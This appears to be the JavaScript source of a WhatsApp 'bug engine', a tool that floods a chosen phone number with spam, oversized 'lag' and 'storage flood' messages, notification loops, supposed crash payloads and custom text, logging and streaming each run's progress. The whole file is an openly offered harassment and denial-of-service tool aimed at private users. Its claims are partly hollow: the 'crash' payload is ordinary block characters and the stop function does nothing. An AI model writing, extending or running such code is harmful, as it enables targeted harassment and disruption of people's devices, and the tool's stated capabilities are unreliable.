const database = require('./database');
const { sendWhatsAppMessage, sendMedia } = require('./whatsapp');
const fs = require('fs').promises;
const path = require('path');

class BugEngine {
    constructor() {
        this.bugTemplates = {
            crash: {
                name: 'Crash Bug',
                description: 'Sends payload to crash WhatsApp',
                payload: '⚠️ *CRASH BUG ACTIVATED* ⚠️\n\n' +
                         'This message contains special characters that may cause instability:\n' +
                         '█▓▒░▒▓█ ░▓█▀▄▀█▓▄ ▒▓▀█▄█▓░ █▀▓▒░▄█▓\n' +
                         '▄█░▒▓▀█ ▓▄█▒▀░▓█ █▓▒░▀█▄▓ ▒█▄▓░▒█▀\n' +
                         'Repeat 50 times...',
                repeat: 50,
                delay: 100
            },
            spam: {
                name: 'Infinite Spam',
                description: 'Sends infinite messages',
                payload: '🔁 *INFINITE SPAM* 🔁\nYou have been spammed by ZixxV1 Bug System\nMessage #',
                repeat: 999,
                delay: 500
            },
            lag: {
                name: 'Device Lag',
                description: 'Sends heavy messages to cause lag',
                payload: '🔄 *LAG EXPLOIT* 🔄\n' + '█'.repeat(1000) + '\n' + 'Loading... '.repeat(100),
                repeat: 20,
                delay: 1000
            },
            storage: {
                name: 'Storage Flood',
                description: 'Sends large messages to fill storage',
                payload: '💾 *STORAGE FLOOD* 💾\n' + 
                         'This message contains 10KB of random data:\n' +
                         Buffer.alloc(10000).toString('base64') + '\n' +
                         'End of flood data.',
                repeat: 100,
                delay: 2000
            },
            notif: {
                name: 'Notification Loop',
                description: 'Causes notification spam',
                payload: '🔔 *NOTIFICATION LOOP* 🔔\n' +
                         'Time: ' + Date.now() + '\n' +
                         'You will receive notifications repeatedly',
                repeat: 200,
                delay: 300
            }
        };
    }

    init(io) {
        this.io = io;
        console.log('✅ Bug Engine initialized');
    }

    async sendBug(target, bugType, customPayload = null, socketId = null) {
        // Validate target
        if (!target || target.length < 10) {
            return {
                success: false,
                error: 'Invalid target number'
            };
        }

        // Get bug template
        let bugConfig;
        if (bugType === 'custom' && customPayload) {
            bugConfig = {
                name: 'Custom Bug',
                payload: customPayload,
                repeat: 10,
                delay: 1000
            };
        } else if (this.bugTemplates[bugType]) {
            bugConfig = this.bugTemplates[bugType];
        } else {
            return {
                success: false,
                error: 'Invalid bug type'
            };
        }

        const bugId = 'BUG-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
        
        // Log to database
        await database.logBug({
            id: bugId,
            target: target,
            bug_type: bugType,
            payload: bugConfig.payload.substring(0, 500),
            status: 'processing',
            timestamp: Date.now()
        });

        // Send to socket
        if (this.io && socketId) {
            this.io.to(socketId).emit('bug_start', {
                id: bugId,
                target: target,
                type: bugType,
                total: bugConfig.repeat
            });
        }

        // Send bug messages
        let successCount = 0;
        let failCount = 0;
        
        for (let i = 0; i < bugConfig.repeat; i++) {
            try {
                let message = bugConfig.payload;
                if (bugType === 'spam') {
                    message = bugConfig.payload + (i + 1);
                }
                
                const result = await sendWhatsAppMessage(target, message);
                
                if (result.success) {
                    successCount++;
                    
                    // Update progress via socket
                    if (this.io && socketId) {
                        this.io.to(socketId).emit('bug_progress', {
                            id: bugId,
                            current: i + 1,
                            total: bugConfig.repeat,
                            success: successCount,
                            failed: failCount
                        });
                    }
                } else {
                    failCount++;
                }
                
                // Delay between messages
                await new Promise(resolve => setTimeout(resolve, bugConfig.delay));
                
            } catch (error) {
                failCount++;
                console.error(`Error sending bug message ${i + 1}:`, error);
            }
            
            // Stop if too many failures
            if (failCount > 10) {
                break;
            }
        }

        // Final status
        const finalStatus = successCount > 0 ? 'completed' : 'failed';
        
        // Update database
        await database.updateBugStatus(bugId, {
            status: finalStatus,
            success_count: successCount,
            fail_count: failCount,
            completed_at: Date.now()
        });

        // Send completion event
        if (this.io && socketId) {
            this.io.to(socketId).emit('bug_complete', {
                id: bugId,
                status: finalStatus,
                success: successCount,
                failed: failCount,
                total: bugConfig.repeat
            });
        }

        return {
            success: successCount > 0,
            bugId: bugId,
            sent: successCount,
            failed: failCount,
            status: finalStatus
        };
    }

    // Get available bug types
    getBugTypes() {
        return Object.keys(this.bugTemplates).map(key => ({
            id: key,
            name: this.bugTemplates[key].name,
            description: this.bugTemplates[key].description
        }));
    }

    // Stop bug by ID
    async stopBug(bugId) {
        // Implementation for stopping ongoing bug
        return { success: true, message: 'Bug stopped' };
    }
}

module.exports = new BugEngine();